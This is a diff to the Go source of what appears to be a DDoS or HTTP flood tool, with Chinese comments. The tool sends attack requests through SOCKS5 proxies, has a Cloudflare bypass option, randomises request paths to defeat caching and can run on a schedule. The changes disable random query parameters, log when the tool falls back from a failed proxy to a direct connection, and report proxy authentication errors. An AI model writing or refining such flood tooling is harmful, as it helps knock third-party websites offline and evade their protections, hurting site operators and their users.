@@ -108,7 +108,7 @@ func parseArgs() *Config {
 		ProxyFile:        "socks5.txt",
 		CFBypass:         true,
 		RandomPath:       true,
-		RandomParams:     true,
+		RandomParams:     false, // 已禁用，不再添加随机查询参数
 		Schedule:         false,
 		ScheduleInterval: 10,
 		ScheduleDuration: 20,
@@ -122,7 +122,7 @@ func parseArgs() *Config {
 	flag.IntVar(&config.Timeout, "timeout", config.Timeout, "超时时间(秒)")
 	flag.StringVar(&config.ProxyFile, "proxy-file", config.ProxyFile, "SOCKS5代理文件")
 	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
-	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数")
+	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数（已禁用，仅对文件路径添加随机数）")
 	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
 	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
 	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
@@ -319,8 +319,9 @@ func performAttack(config *Config) bool {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		// 尝试回退到直连
+		// 如果使用代理失败，尝试直连
 		if useProxy {
+			fmt.Printf("🔄 代理失败，尝试直连: %v\n", err)
 			client = createDirectClient(config.Timeout)
 			resp, err = client.Do(req)
 		}
@@ -331,6 +332,8 @@ func performAttack(config *Config) bool {
 				fmt.Printf("🚫 连接被拒绝: %v\n", err)
 			} else if strings.Contains(err.Error(), "no route to host") {
 				fmt.Printf("🛣️  无路由到主机: %v\n", err)
+			} else if strings.Contains(err.Error(), "no acceptable authentication methods") {
+				fmt.Printf("🔐 代理认证失败: %v\n", err)
 			} else {
 				fmt.Printf("❌ 请求失败: %v\n", err)
 			}
@@ -424,9 +427,10 @@ func buildFinalURL(baseURL *url.URL, config *Config) string {
 		finalURL.Path = generateRandomPathForFile(finalURL.Path)
 	}
 
-	if config.RandomParams {
-		finalURL.RawQuery = generateRandomParams()
-	}
+	// 不再添加随机查询参数，只对文件路径添加随机数
+	// if config.RandomParams {
+	//	finalURL.RawQuery = generateRandomParams()
+	// }
 
 	return finalURL.String()
 }
